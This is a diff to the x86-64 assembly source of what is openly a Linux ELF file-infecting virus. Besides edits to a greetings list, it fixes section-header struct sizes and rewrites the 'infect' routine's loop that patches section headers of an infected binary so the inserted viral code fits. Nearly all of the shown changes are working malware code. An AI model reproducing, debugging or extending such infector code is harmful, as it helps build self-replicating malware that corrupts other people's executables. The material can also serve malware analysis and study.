@@ -73,14 +73,12 @@ BITS 64
 ; Extra special shoutouts+thank yous to netspooky and sblip for all their support&feedback on this project! 
 ; Silvio (Silvio if you read this then, hello! I love your work!)
 ; elfmaster and TMZ for your amazing Linux vx
-; Travisgoodspeed
-; richinseattle, jduck, botvx, mrphrazer, lauriewired
-; zeta, dnz, srsns, xcellerator, bane, h0wdy, gren, museifu, domino, 0daysimpson
-;
-;
+; TravisGoodspeed
+; richinseattle, jduck, botvx, mrphrazer, lauriewired, suidroot
+; 0daySimpson, zeta, dnz, srsns, xcellerator, museifu, domino, bane, h0wdy, gren
 ; Everyone in the slop pit and all my homies near + far
-; ilysm xoxoxoxoxoxxo
 ;
+; ilysm xoxoxoxoxoxxo
 ;
 ; *********************************
 ; References:
@@ -205,14 +203,14 @@ section	.bss
 	endstruc
 
 	struc elf_shdr
-    	.sh_name		resw 1		; uint32_t   
-    	.sh_type		resw 1		; uint32_t   
+    	.sh_name		resd 1		; uint32_t   
+    	.sh_type		resd 1		; uint32_t   
     	.sh_flags		resq 1		; uint64_t   
     	.sh_addr		resq 1		; Elf64_Addr 
      	.sh_offset		resq 1		; Elf64_Off  
      	.sh_size		resq 1		; uint64_t   
-     	.sh_link		resw 1		; uint32_t   
-     	.sh_info		resw 1		; uint32_t   
+     	.sh_link		resd 1		; uint32_t   
+     	.sh_info		resd 1		; uint32_t   
      	.sh_addralign	resq 1		; uint64_t   
      	.sh_entsize		resq 1		; uint64_t   
 	endstruc
@@ -814,34 +812,41 @@ infect:
 ;	Now update section headers of infected ELF
 ;****************************************************************************************
 
-	xor rdx, rdx
-	mov dx, word [r13 + elf_ehdr.e_shentsize]
+	;xor rdx, rdx
+	;mov dx, word [r13 + elf_ehdr.e_shentsize]
 	xor r11, r11
 	xor rcx, rcx
+	mov word cx, [r13 + elf_ehdr.e_shnum]
 	check_shdrs:
-		push rcx
+		;push rcx
 		.shdr_loop:
-			cmp qword [r13 + r15 + elf_shdr.sh_offset], vxoffset
+			mov r10d, dword [r13 + r15 + elf_shdr.sh_offset]
+			cmp r10d, vxoffset
 			jge .mod_subsequent_shdr
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
-			add r11, [r13 + r15 + elf_shdr.sh_size]
-			cmp r10, r11
-			jne .mod_subsequent_shdr
-			add qword [r13 + r15 + elf_shdr.sh_size], vlen
-
-
+			add r11d, dword [r13 + r15 + elf_shdr.sh_size]
+			cmp r11d, vxoffset
+			je .mod_curr_shdr
+			jmp .mod_subsequent_shdr
+			.mod_curr_shdr:
+				add dword [r13 + r15 + elf_shdr.sh_size], vlen
 			.mod_subsequent_shdr:
-				add qword [r13 + r15 + elf_shdr.sh_offset], PAGESIZE
-		;.next_shdr:
-		pop rcx
-		inc rcx 
-		add r15, rdx 
-		cmp rcx, [r13 + elf_ehdr.e_shnum]
-		jl .shdr_loop
+				add dword [r13 + r15 + elf_shdr.sh_offset], PAGESIZE
+		.next_shdr:
+			dec cx 
+			add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			;add [hostentry_offset], word [r13 + elf_hdr.phentsize]
+			cmp cx, 0
+			jg .shdr_loop
+		;pop rcx
+		;inc rcx 
+		;add r15, rdx 
+		;cmp rcx, [r13 + elf_ehdr.e_shnum]
+		;jl .shdr_loop
 
 	mov r11, qword [r13 + elf_ehdr.e_shoff]
 	mov qword [oshoff], r11
-	cmp qword r11, [vxoffset]
+	cmp dword r11d, vxoffset
 	;jg .patch_ehdr_shoff
 	jl frankenstein_elf
 	jmp fin_infect
